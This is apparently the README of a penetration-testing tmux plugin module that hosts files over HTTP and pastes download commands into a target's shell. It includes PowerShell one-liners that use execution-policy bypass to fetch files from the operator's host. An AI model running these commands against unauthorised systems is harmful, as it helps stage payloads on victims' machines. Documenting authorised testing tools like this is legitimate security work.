# HttpExchange Module

This module provides a simple but efficient way of file download from the host to the target systems. It is using python http server and predefined commands / scripts to be used on the target.

It can be extended by csv files with new commands as you like and has some dumb replacement parser to use dynamic values from penmux options, etc.

## 1. Keytable

Not implemented.

## 2. Options

The following configurable options are used by the Commander module.

| Option | Type | Default | Description |
|--------|------|---------|-------------|
|CommandSearchPath | String | $HOME/.tmux/plugins/tmux-penmux/modules/comm/HttpExchange/commands | The search path for csv files providing commands |
|NoConfirm | Boolean | false | If this option is true the selected command will be send to the tmux pane including enter, so that it will run directly |
|HttpHost | String | 127.0.0.1 | The http server address to use |
|HttpPort | Integer | 8080 | The http server port to use |
|UseSessionDir | Boolean | true | If enabled it will use the session directory (if working inside a session) and place the http root folder underneeth it |
|HttpRootDirBase | String | $HOME/.tmux/penmux/httpexchange/#S/ | The default directory used as http root dir (if no session or UseSessionDir is false). Every tmux formats can be used |

## 3. Adding snippets

You can extend the HttpExchange with commands to your like. Either by extending existing csv files or creating new ones. The module is loading any csv file from the 'CommandSearchPath' recursively so that they can be grouped by using nested directories.

**If you're adding any commands, please create an issue / pr so that others can benefit from**

### Needed files

For a new group of commands, you need to create two files (csv and desc) under any sub folder inside the 'CommandSearchPath' directory.
It has an empty custom folder that should be used for custom snippets and is not included in the git source.

Follow these steps to create a new snippet group (default configuration):
```
mkdir -p $HOME/.tmux/plugins/tmux-penmux/modules/comm/HttpExchange/commands/custom/my/new/group
touch $HOME/.tmux/plugins/tmux-penmux/modules/auxiliary/HttpExchange/commands/custom/my/new/group/sub.csv
echo "My sub group provides some cool stuff" $HOME/.tmux/plugins/tmux-penmux/modules/comm/HttpExchange/commands/custom/my/new/group/sub.desc
```
The csv format is using just ',' as separator and contains the following columns:
| name | description | command |
|------|-------------|---------|
|Unique name which is shown in the selector | A description of what the command is doing | The command, which is to be executed |

As example checkout the windows group under 'commands'

windows.desc (this is the description shown by the selection window):
```
Predefined windows download commands
```
windows.csv (this is the csv file containing the command definitions):
```
name,description,command
psIwrHome,Download file using powershell webrequest into home dir,powershell -nop -ep bypass iwr -outfile $HOME/$$fileName$$ -uri http://###HttpHost###:###HttpPort###/$$file$$
psIwrTemp,Download file using powershell webrequest into temp dir,powershell -nop -ep bypass iwr -outfile $env:TEMP/$$fileName$$ -uri http://###HttpHost###:###HttpPort###/$$file$$
psIwr,Download file using powershell webrequest into act dir,powershell -nop -ep bypass iwr -outfile $$fileName$$ -uri http://###HttpHost###:###HttpPort###/$$file$$
```

### Breaking it down

Let's check out one line to get an idea on what is going on:
```
psIwrHome,Download file using powershell webrequest into home dir,powershell -nop -ep bypass iwr -outfile $HOME/$$fileName$$ -uri http://###HttpHost###:###HttpPort###/$$file$$
```
- The first part `psIwrHome` is just the selector name shown to the user.
- The second part `Download file using powershell webrequest into home dir` is just the description of what the command will do shown to the user.
- The third part `powershell -nop -ep bypass iwr -outfile $HOME/$$fileName$$ -uri http://###HttpHost###:###HttpPort###/$$file$$` is the command that will be pasted into the target pane. The two placeholders `$$fileName$$` and `$$file$$` are for the following reason: `$$file$$` will be a relative path beneath the http root dir (recursive scan) and `$$fileName$$` will be the extracted file name without the path (used at the target to save the file)

### Replacement / Expanding

For detailed information of what can be added as dynamic values please refer to [String replacements](../misc/Replacements.md)

## 4. Development information

**TODO**
